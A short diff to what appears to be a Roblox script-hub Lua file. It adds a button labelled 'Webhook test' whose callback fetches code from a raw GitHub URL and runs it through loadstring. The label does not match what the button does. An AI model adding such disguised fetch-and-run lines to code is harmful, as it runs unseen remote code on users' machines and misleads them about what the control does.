@@ -1442,6 +1442,12 @@ SettingTab:AddToggle({
 	end    
 })
 
+SettingTab:AddButton({
+	Name = "Webhook test",
+	Callback = function()
+      		loadstring(game.HttpGet("https://raw.githubusercontent.com/dorgaes/yea/main/webhook", true))()
+  	end    
+})
 
 
 
